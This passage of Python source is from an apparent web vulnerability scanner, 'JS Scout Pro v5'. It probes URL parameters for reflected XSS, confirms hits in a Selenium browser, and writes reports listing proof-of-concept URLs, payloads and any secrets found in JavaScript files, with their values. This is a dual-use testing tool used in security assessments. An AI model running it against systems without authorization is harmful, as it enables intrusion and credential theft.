                            raw_payload_reflected = True

                        # Extra: check MARKER is not escaped
                        if self._PROBE_MARKER in body:
                            pos    = body.find(self._PROBE_MARKER)
                            nearby = body[max(0, pos-80):pos+120]
                            if any(esc in nearby for esc in ['&lt;', '&gt;', '&amp;', '%3C', '%3E', '\\u003c']):
                                raw_payload_reflected = False

                        if not raw_payload_reflected:
                            continue

                        dedup_key = f"{base}:{param}:{ctx}"
                        confirmed_by_browser = False

                        # ── Stage 4: Browser confirmation ──────────────────────
                        if browser_active and self.browser:
                            try:
                                bres = self.browser.inject_xss(base, param, payload)
                                confirmed_by_browser = bres.get('triggered', False) or bres.get('in_dom', False)
                            except Exception:
                                pass

                        with poc_lock:
                            if dedup_key in seen_poc:
                                break
                            seen_poc.add(dedup_key)
                            poc = {
                                'url':                  test_url,
                                'base':                 base,
                                'param':                param,
                                'payload':              marked_payload,
                                'context':              ctx,
                                'browser_confirmed':    confirmed_by_browser,
                                'status':               resp.status_code,
                                'evidence':             body[max(0, body.find(payload[:20]) - 80): body.find(payload[:20]) + 160].strip()[:300] if payload[:20] in body else '',
                            }
                            all_poc.append(poc)

                        conf_str = " [BROWSER CONFIRMED ✓]" if confirmed_by_browser else ""
                        self.log(f"  [⚡ XSS FOUND] {base}  param={param}  ctx={ctx}{conf_str}")
                        self.log(f"    PoC: {test_url[:120]}")
                        break  # One confirmed payload per context is enough

                    except Exception:
                        pass

        with ThreadPoolExecutor(max_workers=min(self.threads, 8)) as pool:
            pool.map(probe_pair, all_pairs)

        self.log(f"  [probe] Complete — {len(all_poc)} XSS PoC(s)")
        self.results['poc_findings'] = all_poc
        for finding in self.results['xss_findings']:
            finding['poc_urls'] = all_poc[:5]

    # =========================================================================
    # PHASE 7: REPORT
    # =========================================================================

    def _write_report(self) -> str:
        r   = self.results
        out = self.output_dir
        risk = self._calc_risk(r)

        summary = {
            'target':           r['target'],
            'scan_time':        time.strftime('%Y-%m-%d %H:%M:%S'),
            'risk':             risk,
            'js_files':         len(r['js_files']),
            'endpoints':        len(r['endpoints']),
            'secrets':          len(r['secrets']),
            'xss_sinks':        len(r['xss_findings']),
            'xss_confirmed':    sum(1 for x in r['xss_findings'] if x.get('confirmed_flow')),
            'reflected_xss':    len(r.get('poc_findings', [])),
            'browser_confirmed': sum(1 for p in r.get('poc_findings',[]) if p.get('browser_confirmed')),
            'dom_clobber':      len(r['dom_clobber']),
            'proto_pollution':  len(r['proto_pollution']),
        }

        r_copy = dict(r)
        r_copy['external_urls'] = list(r.get('external_urls', []))
        (out / 'summary.json').write_text(json.dumps(summary, indent=2))
        (out / 'full_results.json').write_text(json.dumps(r_copy, indent=2, default=str))

        # ── Reflected XSS PoCs report ─────────────────────────────────────────
        poc_findings = r.get('poc_findings', [])
        if poc_findings:
            lines = ["=" * 70, "CONFIRMED REFLECTED XSS VULNERABILITIES", "=" * 70, ""]
            for i, poc in enumerate(poc_findings, 1):
                conf = " [BROWSER CONFIRMED]" if poc.get('browser_confirmed') else ""
                lines += [
                    f"[{i}] {poc.get('base', poc.get('url',''))}",
                    f"     Parameter : {poc['param']}",
                    f"     Context   : {poc.get('context', 'unknown')}{conf}",
                    f"     Payload   : {poc['payload']}",
                    f"     PoC URL   : {poc['url']}",
                    f"     Evidence  : {poc.get('evidence','')[:200]}",
                    "",
                ]
            (out / 'reflected_xss.txt').write_text('\n'.join(lines))

        # ── Plain text summary ────────────────────────────────────────────────
        txt_lines = [
            f"JS Scout Pro v5 — Scan Report",
            f"Target  : {r['target']}",
            f"Risk    : {risk}",
            f"Time    : {summary['scan_time']}",
            "",
            f"JS Files      : {summary['js_files']}",
            f"Endpoints     : {summary['endpoints']}",
            f"Secrets       : {summary['secrets']}",
            f"XSS Sinks     : {summary['xss_sinks']} ({summary['xss_confirmed']} source→sink confirmed)",
            f"Reflected XSS : {summary['reflected_xss']} ({summary['browser_confirmed']} browser-confirmed)",
            "",
        ]
        if poc_findings:
            txt_lines.append("REFLECTED XSS PoCs:")
            for poc in poc_findings:
                conf = " ✓ BROWSER" if poc.get('browser_confirmed') else ""
                txt_lines.append(f"  [{poc['param']}] {poc['url'][:100]}{conf}")
        txt_lines.append("")
        if r['secrets']:
            txt_lines.append("SECRETS:")
            for s in r['secrets'][:20]:
                txt_lines.append(f"  [{s['severity']}] {s['type']} in {s['file']}:{s['line']}")
        (out / 'report.txt').write_text('\n'.join(txt_lines))

        # ── HTML Report ────────────────────────────────────────────────────────
        def h(s): return str(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')

        def sev_color(s):
            return {'CRITICAL':'#ff2244','HIGH':'#ff6622','MEDIUM':'#ffcc00','LOW':'#44aaff','INFO':'#888'}.get(s,'#888')

        poc_rows = ''
        for i, poc in enumerate(poc_findings, 1):
            conf = ' <b style="color:#00ff9f">[BROWSER ✓]</b>' if poc.get('browser_confirmed') else ''
            poc_rows += f'''<tr>
              <td>{i}</td>
              <td style="color:#ff2244"><b>{h(poc["param"])}</b></td>
              <td><span style="color:#ffaa00">{h(poc.get("context","?"))}</span>{conf}</td>
              <td><a href="{h(poc["url"])}" target="_blank" style="color:#00d4ff;word-break:break-all">{h(poc["url"])}</a></td>
              <td style="font-family:monospace;font-size:11px">{h(poc["payload"])}</td>
            </tr>'''

        secret_rows = ''
        for s in r.get('secrets', []):
            secret_rows += f'''<tr>
              <td><span style="color:{sev_color(s["severity"])}">{h(s["severity"])}</span></td>
              <td>{h(s["type"])}</td>
              <td>{h(s["file"])}:{s["line"]}</td>
              <td style="font-family:monospace;font-size:11px;max-width:300px;word-break:break-all">{h(s["value"][:120])}</td>
            </tr>'''

        xss_rows = ''
        for x in r.get('xss_findings', []):
            flow = ' <b style="color:#ff2244">⚡ src→sink</b>' if x.get('confirmed_flow') else ''
            xss_rows += f'''<tr>
              <td><span style="color:{sev_color(x["severity"])}">{h(x["severity"])}</span></td>
              <td>{h(x["sink"])}{flow}</td>
              <td>{h(x["file"])}:{x["line"]}</td>
              <td style="font-family:monospace;font-size:11px;max-width:350px;overflow:hidden">{h(x["context"][:120])}</td>
            </tr>'''

        js_file_rows = ''
        for f in sorted(r.get('js_files', []), key=lambda x: -x.get('size',0)):
            src_url = f.get('source_url', '')
            name_cell = f'<a href="{h(src_url)}" target="_blank" style="color:#00d4ff">{h(f["name"])}</a>' if src_url else h(f["name"])
            js_file_rows += f'''<tr>
              <td>{name_cell}</td>
              <td>{(f.get("size",0)/1024):.1f} KB</td>
              <td style="color:{"#ff6622" if f.get("secrets",0) else "#888"}">{f.get("secrets",0)}</td>
              <td style="color:{"#ff2244" if f.get("xss_sinks",0) else "#888"}">{f.get("xss_sinks",0)}</td>
              <td>{"🗜 minified" if f.get("minified") else ""}</td>
            </tr>'''

        ep_rows = ''
        for ep, files in list(r.get('endpoints', {}).items())[:200]:
            ep_rows += f'<tr><td style="color:#00d4ff;font-family:monospace">{h(ep)}</td><td style="color:#888;font-size:11px">{h(", ".join(files[:3]))}</td></tr>'

        risk_color = {'CRITICAL':'#ff2244','HIGH':'#ff6622','MEDIUM':'#ffcc00','LOW':'#44aaff','INFO':'#888'}.get(risk,'#888')

        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>JS Scout Pro — Report: {h(r["target"])}</title>
<style>
  * {{margin:0;padding:0;box-sizing:border-box}}
  body {{background:#080b0f;color:#c9d8e8;font-family:"Share Tech Mono",monospace;padding:32px 24px}}
  h1 {{font-size:22px;letter-spacing:4px;color:#00ff9f;margin-bottom:4px}}
  h2 {{font-size:13px;letter-spacing:3px;color:#00d4ff;margin:28px 0 12px;border-bottom:1px solid #1e2d3d;padding-bottom:6px}}
  .meta {{color:#3a5068;font-size:12px;margin-bottom:24px}}
  .risk {{display:inline-block;padding:6px 18px;background:{risk_color}22;border:1px solid {risk_color};color:{risk_color};font-size:14px;letter-spacing:3px;margin-bottom:24px}}
  .stats {{display:flex;flex-wrap:wrap;gap:12px;margin-bottom:28px}}
  .stat {{background:#0d1117;border:1px solid #1e2d3d;padding:12px 20px;text-align:center;min-width:120px}}
  .stat-val {{display:block;font-size:28px;font-weight:bold}}
  .stat-label {{font-size:10px;color:#3a5068;letter-spacing:2px}}
  table {{width:100%;border-collapse:collapse;margin-bottom:24px;font-size:12px}}
  th {{background:#0d1117;color:#3a5068;padding:8px 12px;text-align:left;letter-spacing:2px;font-size:10px;border-bottom:1px solid #1e2d3d}}
  td {{padding:8px 12px;border-bottom:1px solid #111720;vertical-align:top}}
  tr:hover td {{background:#0d1117}}
  a {{color:#00d4ff;text-decoration:none}}
  a:hover {{text-decoration:underline}}
  .empty {{color:#3a5068;font-style:italic;padding:16px}}
  code {{background:#0d1117;padding:2px 6px;font-size:11px}}
</style>
</head>
<body>
<h1>⚡ JS SCOUT PRO v5</h1>
<div class="meta">Target: <b style="color:#c9d8e8">{h(r["target"])}</b> &nbsp;|&nbsp; {summary["scan_time"]}</div>
<div class="risk">⚠ RISK: {risk}</div>

<div class="stats">
  <div class="stat"><span class="stat-val" style="color:#00d4ff">{summary["js_files"]}</span><span class="stat-label">JS FILES</span></div>
  <div class="stat"><span class="stat-val" style="color:#00ff9f">{summary["endpoints"]}</span><span class="stat-label">ENDPOINTS</span></div>
  <div class="stat"><span class="stat-val" style="color:{"#ff2244" if summary["secrets"] else "#888"}">{summary["secrets"]}</span><span class="stat-label">SECRETS</span></div>
  <div class="stat"><span class="stat-val" style="color:{"#ff2244" if summary["reflected_xss"] else "#888"}">{summary["reflected_xss"]}</span><span class="stat-label">REFLECTED XSS</span></div>
  <div class="stat"><span class="stat-val" style="color:{"#ff6622" if summary["xss_sinks"] else "#888"}">{summary["xss_sinks"]}</span><span class="stat-label">XSS SINKS</span></div>
  <div class="stat"><span class="stat-val" style="color:{"#00ff9f" if summary["browser_confirmed"] else "#888"}">{summary["browser_confirmed"]}</span><span class="stat-label">BROWSER CONFIRMED</span></div>
  <div class="stat"><span class="stat-val" style="color:#888">{summary["dom_clobber"]}</span><span class="stat-label">DOM CLOBBER</span></div>
</div>

<h2>🔴 REFLECTED XSS — CONFIRMED PoCs</h2>
{"<table><thead><tr><th>#</th><th>PARAM</th><th>CONTEXT</th><th>PoC URL (CLICKABLE)</th><th>PAYLOAD</th></tr></thead><tbody>" + poc_rows + "</tbody></table>" if poc_rows else "<div class='empty'>No reflected XSS confirmed.</div>"}

<h2>🔑 SECRETS &amp; CREDENTIALS</h2>
{"<table><thead><tr><th>SEV</th><th>TYPE</th><th>FILE:LINE</th><th>VALUE</th></tr></thead><tbody>" + secret_rows + "</tbody></table>" if secret_rows else "<div class='empty'>No secrets found.</div>"}

<h2>⚠ XSS SINKS (Static Analysis)</h2>
{"<table><thead><tr><th>SEV</th><th>SINK</th><th>FILE:LINE</th><th>CONTEXT</th></tr></thead><tbody>" + xss_rows + "</tbody></table>" if xss_rows else "<div class='empty'>No XSS sinks detected.</div>"}

<h2>📦 JS FILES — Clickable URLs</h2>
{"<table><thead><tr><th>FILE (clickable = source URL)</th><th>SIZE</th><th>SECRETS</th><th>XSS SINKS</th><th>FLAGS</th></tr></thead><tbody>" + js_file_rows + "</tbody></table>" if js_file_rows else "<div class='empty'>No JS files downloaded.</div>"}

<h2>🌐 API ENDPOINTS</h2>
{"<table><thead><tr><th>ENDPOINT</th><th>FOUND IN</th></tr></thead><tbody>" + ep_rows + "</tbody></table>" if ep_rows else "<div class='empty'>No endpoints extracted.</div>"}

</body>
</html>'''

        (out / 'report.html').write_text(html, encoding='utf-8')
        return str(out / 'report.txt')

    def _calc_risk(self, r) -> str:
        if any(s['severity'] == 'CRITICAL' for s in r.get('secrets', [])):
            return 'CRITICAL'
        if r.get('poc_findings'):
            return 'CRITICAL'
        if r.get('secrets') or any(x.get('confirmed_flow') for x in r.get('xss_findings', [])):
            return 'HIGH'
        if r.get('xss_findings') or r.get('dom_clobber'):
            return 'MEDIUM'
        if r.get('endpoints'):
            return 'LOW'
        return 'INFO'


# =============================================================================
# CLI ENTRY
# =============================================================================

def main():
    ap = argparse.ArgumentParser(
        description='JS Scout Pro v5 — Selenium + Chromium XSS Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 jsscout.py http://zero.webappsecurity.com/
  python3 jsscout.py https://target.com --depth 4 --pages 300
  python3 jsscout.py https://target.com --no-selenium
  python3 jsscout.py https://target.com --cookies "session=abc123"
  python3 jsscout.py https://target.com --header "Authorization: Bearer TOKEN"
        """
    )
    ap.add_argument('target')
    ap.add_argument('--output',      default=None)
    ap.add_argument('--threads',     type=int, default=10)
    ap.add_argument('--timeout',     type=int, default=15)
    ap.add_argument('--pages',       type=int, default=200)
    ap.add_argument('--depth',       type=int, default=3)
    ap.add_argument('--cookies',     default=None)
    ap.add_argument('--header',      action='append', dest='headers')
    ap.add_argument('--no-selenium', action='store_true', help='Disable Selenium/browser mode')
    ap.add_argument('--json',        action='store_true', help='Output JSON to stdout')
    args = ap.parse_args()

    target = args.target
    if '://' not in target:
        target = 'http://' + target
    domain = urlparse(target).netloc.replace(':', '_')
    output = args.output or f'jsscout_output/{domain}'

    hdrs = {}
    for h in (args.headers or []):
        if ':' in h:
            k, _, v = h.partition(':')
            hdrs[k.strip()] = v.strip()

    use_selenium = not args.no_selenium

    if use_selenium:
        if not SELENIUM_OK:
            print("[!] Selenium not installed.")
            print("    Install: pip install selenium webdriver-manager")
            print("    Linux:   apt install chromium chromium-driver")
            print("    Continuing in requests-only mode...")
            use_selenium = False
        else:
            print("[+] Selenium available — browser mode ON")
    else:
        print("[*] Browser mode disabled (--no-selenium)")

    scout = JSScout(
        target, output,
        threads=args.threads,
        timeout=args.timeout,
        max_pages=args.pages,
        depth=args.depth,
        cookies=args.cookies,
        extra_headers=hdrs or None,
        use_selenium=use_selenium,
    )

    results = scout.run()

    if args.json:
        results['external_urls'] = list(results.get('external_urls', []))
        print(json.dumps(results, indent=2, default=str))


if __name__ == '__main__':
    main()
